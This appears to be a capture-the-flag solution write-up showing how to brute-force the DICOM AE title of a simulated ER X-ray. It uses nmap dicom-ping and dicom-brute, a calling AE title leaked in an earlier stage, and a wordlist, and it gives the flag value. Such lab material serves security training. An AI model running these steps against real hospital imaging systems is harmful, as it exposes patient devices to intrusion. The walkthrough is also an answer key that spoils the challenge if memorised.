# Stage 1 solution — X-ray AE-title brute force (Flag 1)

**Flag 1 is the accepted *called* AE title of the ER Portable X-ray.** AE titles
are capped at 16 bytes, so the flag is that short secret string itself (example:
`BHV_XR_9F2C71A4`), submitted verbatim — not a `BHV{...}` wrapper.

Target in these examples: `$TARGET` = the per-team X-ray address, port `11112`.

## 1. Detect the service and prove AE enforcement

```bash
nmap -p 11112 --script dicom-ping $TARGET
```

Expected:

```
PORT      STATE SERVICE
11112/tcp open  dicom
| dicom-ping:
|   dicom: DICOM Service Provider discovered!
|_  config: Called AET check enabled
```

`Called AET check enabled` is the tell: the X-ray rejects associations whose
called AE title it doesn't recognise (A-ASSOCIATE-RJ). You can watch the reject
in Wireshark — filter `dicom` and look for `A-ASSOCIATE-RJ` with
*Result: rejected-permanent, Source: DICOM UL service-user*.

## 2. You also need a valid *calling* AE title (the WiFi dependency)

The X-ray additionally restricts **who** may connect: only known fleet devices
(their calling AE titles) are allowed. nmap's default calling AE title is
`ECHOSCU`, which is **not** on the allowlist, so a naive brute finds nothing:

```bash
nmap -p 11112 --script dicom-brute --script-args passdb=aets.txt $TARGET
#   Accounts: No valid accounts found      <-- blocked by calling-AET enforcement
```

The valid calling AE titles are the device AE titles leaked by the **WiFi
stage's device-inventory page** (e.g. `XRAY_ER_01`, `CARM_OR_03`, `PACS_CORE_01`).

## 3. Build the wordlist from the inventory page

The same inventory page lists a pool of "service / console AE titles". Save them
one per line — the live one is hidden among the decoys:

```bash
cat > aets.txt <<'EOF'
WORKSTATION1
AETADMIN
SRV_DCM_01
DCM4CHEE
MODALITY_SVC
BHV_XR_9F2C71A4
XR_SERVICE
SVC_FIELD_ENG
STORESCP
ARCHIVE_SVC
EOF
```

## 4. Brute force the called AE title with a valid calling AE title

```bash
nmap -p 11112 --script dicom-brute \
  --script-args dicom.calling_aet=XRAY_ER_01,passdb=aets.txt $TARGET
```

Expected:

```
| dicom-brute:
|   Accounts:
|     Called Application Entity Title:BHV_XR_9F2C71A4 - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
```

**`BHV_XR_9F2C71A4` is Flag 1.** It's also the called AE title you carry into
stage 2 (`-aec`).

### Notes / gotchas
- Without `dicom.calling_aet=<valid device>` the brute returns nothing — that's
  the intended dependency on the WiFi stage, not a broken challenge.
- If `dicom-ping` reports `DICOM SCU allows any AET`, enforcement is off (wrong
  target / staging box).
